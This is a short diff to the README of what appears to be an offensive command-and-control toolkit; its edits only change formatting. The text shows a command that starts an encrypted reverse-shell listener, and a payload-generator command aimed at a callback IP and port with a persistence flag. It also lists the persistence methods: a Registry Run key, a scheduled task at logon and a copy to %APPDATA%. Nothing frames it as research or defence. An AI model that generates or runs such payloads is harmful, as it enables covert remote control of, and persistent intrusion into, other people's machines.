@@ -42,11 +42,8 @@ Traffic jitter<br>
 
 <br>
 
-## start the sh3ll catch3r: <br>
+#### start the sh3ll catch3r in encrypted mode:
 
-#### Encrypted mode:
-
-<br>
 
      python3 c2_catcher.py
 
@@ -64,10 +61,11 @@ Traffic jitter<br>
  payload w/ auto install persistence:
  
     ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted --persist
-Puts data on disk
-Registry Run key
-Scheduled task at logon
-File copy to %APPDATA%
+    
+Puts data on disk<br>
+Registry Run key<br>
+Scheduled task at logon<br>
+File copy to %APPDATA%<br>
  
 ---
 
